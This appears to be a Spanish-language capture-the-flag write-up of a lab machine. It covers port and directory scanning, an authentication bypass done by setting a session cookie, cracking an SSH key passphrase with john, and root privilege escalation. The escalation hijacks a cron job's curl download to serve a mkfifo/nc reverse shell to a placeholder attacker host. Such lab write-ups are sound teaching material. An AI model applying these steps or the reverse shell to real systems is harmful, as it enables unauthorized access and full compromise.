

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.30s latency).
Scanned at 2023-07-02 07:48:05 EDT for 18s
Not shown: 50348 filtered ports, 15185 closed ports
Reason: 50348 no-responses and 15185 resets
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 2 puertos abiertos. Al navegar dentro del servidor web, no podemos hacer mucho. Incluso si miramos el page source de la pagina no encontraremos mucho, solo una nota comica. Pasamos a enumerar directorios ocultos con `gobuster`.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/02 07:54:04 Starting gobuster
=====================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)

```

# Intrusion

Anteriormente descubrimos el directorio /admin. Exploraremos el servidor web y lo inspeccionamos. Nos dirigimos al apartado **debugger** y exploraremos **login.js**.

Este codigo, tiene como funcion realizar una solicitud POST a un servidor. Para poder acceder al servidor, modificamos `Cookies.set("SessionToken",statusOrCookie)`
Le vamos a asignar un numero, algun dato o cualquier cosa que querramos asignarle.

Vamos al apartado de **Console** y ejecutamos el siguiente codigo: `Cookies.set("SessionToken",47548893)`.

Al refrescar la pagina, tendremos acceso al contenido en /admin que nos muestra el nombre de usuario y la ida_rsa para establecer una conexion ssh.

Una vez copiada la id_rsa, va a estar protegida. Utilizaremos las caracteristicas de **john** para crackearla y obtener sus credenciales.

```bash
ss2john id_rsa > james.txt
john --wordlist=/Path/Wodlist james.txt
```

Obtenemos la password y procedemos a establecer una conexion ssh al sistema, tenemos que darle permisos apropiados a id_rsa para poder conectarnos exitosamente.

```bash
chmod 600 id_rsa
ssh -i id_rsa james@IPTARGET
```

# Priv.Escalation

En el escritorio de james, vemos una nota de texto hablando sobre crontabs, asique listaremos si hay tareas automatizadas en el sistema con `cat /etc/crontabs`
El usuario root hace utiliza `curl` para recibir una respuesta de /downloads/src/buildscript.sh

Primero, tenemos que editar `/etc/hosts` de la maquina victima, y poner nuestro LHOST en overpass.thm.
Una vez hecho esto, nos dirigimos a nuestra maquina atacante, creamos un directorio con el mismo nombre donde el usuario root lanza `curl` y sobreescribimos el archivo buildscript.sh con nuestro reverse shell para obtener una sesion interactiva como usuario root.

```bash
mkdir -p /downloads/src
nano buildscript.sh
	#!/bin/bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f

```

Nos ponemos en escucha, y lanzamos un servidor python http en el puerto 80 para que funcione correctamente. El servidor python http tiene que ser ejecutado dentro del directorio anterior a /downloads. Por ejemplo, creaste en /home/overpass/download/src/
tendras que lanzar el servidor http en /overpass.

```bash
nc -nvlp LPORT
sudo python3 -m http.server 80
```

Esperamos unos segundos y una vez recibida el codigo status 200 en nuestro servidor python ya tendremos nuetra shell con usuario raiz root.




